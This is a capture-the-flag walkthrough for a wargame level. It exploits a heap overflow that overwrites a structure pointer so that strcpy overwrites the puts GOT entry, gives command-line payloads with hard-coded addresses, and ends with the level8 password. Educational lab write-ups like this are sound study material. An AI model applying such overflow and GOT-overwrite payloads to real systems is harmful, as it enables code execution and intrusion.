# Level 07 Walkthrough

## Binary analysis

The binary allocates two structures and two string buffers on the heap. It uses `strcpy` to copy user input into the first buffer, then again into the second buffer, using pointers stored in the structures. The goal is to overflow the first buffer to overwrite the pointer in the second structure, so that the second `strcpy` writes to a controlled location (e.g., the GOT entry for `puts`).

Relevant code:
```
- malloc for struct_1 (0x0804a018)
- malloc for buffer_1 (0x0804a028)
- malloc for struct_2 (0x0804a038)
- malloc for buffer_2 (0x0804a048)

Overflow buffer_1 to overwrite struct_2[1] (pointer at 0x0804a03c).
```

## Exploitation

We overflow buffer_1 (starting at 0x0804a028) with 20 bytes to reach the pointer at 0x0804a03c. We overwrite this pointer with the address of the GOT entry for `puts` (0x08049928). Then, for the second argument, we provide the address of a function to execute (e.g., the address of a shell function or system call).

To determine the required padding, we need to understand the layout of the structures and buffers on the heap. Here, `buffer_1` starts at address `0x0804a028` and the pointer we want to overwrite in `struct_2` is located at `0x0804a03c`. The difference between these two addresses gives the number of bytes to fill in order to reach the target field:

0x0804a03c - 0x0804a028 = 0x14 = 20 bytes

So, we need 20 bytes of padding (for example, `"A"*20`) to fill `buffer_1` up to the pointer in `struct_2`.

Example payload:

```bash
./level7 "$(python3 -c 'print("A"*20 + "\x28\x99\x04\x08")')" "$(python3 -c 'print("\xf4\x84\x04\x08")')"
```

- 20 bytes of padding ("A"*20)
- Overwrite pointer with 0x08049928 (GOT entry for puts)
- Second argument: address to write (e.g., 0x080484f4)

## Commands used

```
./level7 "$(printf 'AAAAAAAAAAAAAAAAAAAA\x28\x99\x04\x08')" "$(printf '\xf4\x84\x04\x08')"
```

## Result

After running the exploit, we get the password for level8:

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```